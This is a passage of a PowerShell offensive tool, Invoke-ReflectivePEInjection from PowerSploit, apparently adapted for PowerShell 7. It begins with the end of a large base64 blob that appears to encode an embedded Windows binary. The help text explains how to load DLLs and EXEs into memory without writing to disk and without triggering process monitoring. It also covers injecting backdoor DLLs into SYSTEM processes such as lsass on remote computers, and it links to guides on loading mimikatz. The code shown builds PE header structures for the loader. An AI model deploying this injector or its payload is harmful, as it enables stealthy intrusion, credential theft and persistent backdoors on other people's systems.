0AAARAURlYnVnQnJlYWsAABsBRGVsZXRlQ3JpdGljYWxTZWN0aW9uAD8BRW50ZXJDcml0aWNhbFNlY3Rpb24AALsBRnJlZUxpYnJhcnkA6AFHZXRDb21tYW5kTGluZVcAdgJHZXRMYXN0RXJyb3IAAIsCR2V0TW9kdWxlSGFuZGxlQQAAxgJHZXRQcm9jQWRkcmVzcwAA5wJHZXRTdGFydHVwSW5mb0EAfANJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uANgDTGVhdmVDcml0aWNhbFNlY3Rpb24AANwDTG9hZExpYnJhcnlBAABrBFF1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyAGwEUXVlcnlQZXJmb3JtYW5jZUZyZXF1ZW5jeQByBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgCCBVNsZWVwAKUFVGxzR2V0VmFsdWUA1AVWaXJ0dWFsUHJvdGVjdAAA1gVWaXJ0dWFsUXVlcnkAACIAX19DX3NwZWNpZmljX2hhbmRsZXIAADkAX19hY3J0X2lvYl9mdW5jAEQAX19kYXlsaWdodAAAVgBfX3BfX19hcmdjAABXAF9fcF9fX2FyZ3YAAFgAX19wX19fd2FyZ3YAWQBfX3BfX2FjbWRsbgBaAF9fcF9fY29tbW9kZQAAWwBfX3BfX2Vudmlyb24AAFwAX19wX19mbW9kZQAAYQBfX3BfX3dlbnZpcm9uAGgAX19zZXR1c2VybWF0aGVycgAAbwBfX3N0ZGlvX2NvbW1vbl92ZnByaW50ZgBzAF9fc3RkaW9fY29tbW9uX3Zmd3ByaW50ZgAAhgBfX3RpbWV6b25lAACJAF9fdHpuYW1lAACzAF9jZXhpdAAAyABfY29uZmlndXJlX25hcnJvd19hcmd2AADJAF9jb25maWd1cmVfd2lkZV9hcmd2AADUAF9jcnRfYXRfcXVpY2tfZXhpdAAA1QBfY3J0X2F0ZXhpdAD3AF9lcnJubwAApgFfaW5pdGlhbGl6ZV9uYXJyb3dfZW52aXJvbm1lbnQAAKgBX2luaXRpYWxpemVfd2lkZV9lbnZpcm9ubWVudAAAqQFfaW5pdHRlcm0AMQJfbG9ja19maWxlAABhB19zZXRfYXBwX3R5cGUAbAdfc2V0X2ludmFsaWRfcGFyYW1ldGVyX2hhbmRsZXIAAG4HX3NldF9uZXdfbW9kZQDjB190enNldAAA/QdfdW5sb2NrX2ZpbGUAAKIIYWJvcnQAuQhhdG9pAADKCGNhbGxvYwAAHQlleGl0AAA2CWZmbHVzaAAASwlmcHV0YwBRCWZyZWUAAFgJZndyaXRlAABZCWdldGMAAG8JaXNsb3dlcgByCWlzc3BhY2UAcwlpc3VwcGVyAIIJaXN4ZGlnaXQAAJEJbG9jYWxlY29udgAApgltYWxsb2MAAKgJbWJybGVuAACrCW1icnRvd2MAswltZW1jcHkAALcJbWVtc2V0AADXCXJlYWxsb2MA8wlzaWduYWwAAPsJc3RyY2F0AAD+CXN0cmNtcAAAAwpzdHJlcnJvcgAABgpzdHJsZW4AAAkKc3RybmNtcAAKCnN0cm5jcHkAFQpzdHJ0b2wAABcKc3RydG91bAAoCnRvbG93ZXIAMQp1bmdldGMAADMKd2NydG9tYgA+Cndjc2xlbgAAUwp3Y3N0b21ic19zAAALAENvbW1hbmRMaW5lVG9Bcmd2VwAAAwBBZGp1c3RXaW5kb3dSZWN0AABzAENyZWF0ZVdpbmRvd0V4QQCkAERlZldpbmRvd1Byb2NBAAC5AERpc3BhdGNoTWVzc2FnZUEAALgBR2V0U3lzdGVtTWV0cmljcwAAPQJMb2FkQ3Vyc29yQQBBAkxvYWRJY29uQQBlAk1lc3NhZ2VCb3hBAIoCUGVla01lc3NhZ2VBAACQAlBvc3RRdWl0TWVzc2FnZQC2AlJlZHJhd1dpbmRvdwAAuQJSZWdpc3RlckNsYXNzRXhBAACBA1RyYW5zbGF0ZU1lc3NhZ2UAALIDV2FpdE1lc3NhZ2UAAAAUIAUAR0RJMzIuZGxsAAAAKCAFACggBQAoIAUAKCAFACggBQAoIAUAKCAFACggBQAoIAUAKCAFACggBQAoIAUAKCAFACggBQAoIAUAKCAFACggBQAoIAUAKCAFAEtFUk5FTDMyLmRsbAAAAAA8IAUAPCAFADwgBQA8IAUAPCAFADwgBQA8IAUAPCAFADwgBQA8IAUAPCAFADwgBQA8IAUAPCAFADwgBQA8IAUAPCAFADwgBQA8IAUAPCAFADwgBQA8IAUAPCAFADwgBQA8IAUAPCAFADwgBQA8IAUAPCAFADwgBQA8IAUAPCAFADwgBQA8IAUAPCAFADwgBQA8IAU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'

function Invoke-ReflectivePEInjection
{
<#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process,
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints,
please lead the Notes section (GENERAL NOTES) for information on how to use them.

1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.

2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the
remote process.

PowerSploit Function: Invoke-ReflectivePEInjection
Author: Joe Bialek, Twitter: @JosephBialek
Code review and modifications: Matt Graeber, Twitter: @mattifestation
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

.PARAMETER PEBytes

A byte array containing a DLL/EXE to load and execute.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
    Options: String, WString, Void. See notes for more information.
    IMPORTANT: For DLLs being loaded remotely, only Void is supported.
    
.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.
    
.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
    loading in to a remote process.

.PARAMETER DoNotZeroMZ

Optional, will not wipe the MZ from the first two bytes of the PE. This is to be used primarily for testing purposes and to enable loading the same PE with Invoke-ReflectivePEInjection more than once.
    
.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
    the wchar_t* returned by WStringFunc() from all the computers.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

.EXAMPLE

Load DemoEXE and run it locally.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.EXAMPLE

Load DemoEXE and run it locally. Forces ASLR on for the EXE.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

.EXAMPLE

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local

.NOTES
GENERAL NOTES:
The script has 3 basic sets of functionality:
1.) Reflectively load a DLL in to the PowerShell process
    -Can return DLL output to user when run remotely or locally.
    -Cleans up memory in the PS process once the DLL finishes executing.
    -Great for running pentest tools on remote computers without triggering process monitoring alerts.
    -By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
2.) Reflectively load an EXE in to the PowerShell process.
    -Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
    -Cleans up memory in the PS process once the DLL finishes executing.
    -Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
3.) Reflectively inject a DLL in to a remote process.
    -Can NOT return DLL output to the user when run remotely OR locally.
    -Does NOT clean up memory in the remote process if/when DLL finishes execution.
    -Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
    -Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.

DLL LOADING NOTES:

PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

For DLL Loading:
Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
wchar_t* : FuncReturnType = WString
char* : FuncReturnType = String
void : Default, don't supply a FuncReturnType

For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
WString : WStringFunc
String : StringFunc
Void : VoidFunc

These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
be declared as follows:
extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

.LINK

http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
#>

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
    
    [Parameter(Position = 1)]
    [String[]]
    $ComputerName,
    
    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
    [String]
    $FuncReturnType = 'Void',
    
    [Parameter(Position = 3)]
    [String]
    $ExeArgs,
    
    [Parameter(Position = 4)]
    [Int32]
    $ProcId,
    
    [Parameter(Position = 5)]
    [String]
    $ProcName,

    [Switch]
    $ForceASLR,

    [Switch]
    $DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FuncReturnType,
                
        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $ProcId,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
    )
    
    ###################################
    ########## Win32 Stuff ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        # This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        ################################################################################################
        #                              ADAPTED TO PS7	                                               #
        ################################################################################################
        $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynamicAssembly, 'Run')
        # $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        ################################################################################################
        #                              END ADAPTED TO PS7	                                       #
        ################################################################################################
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############ ENUM ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ########### STRUCT ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
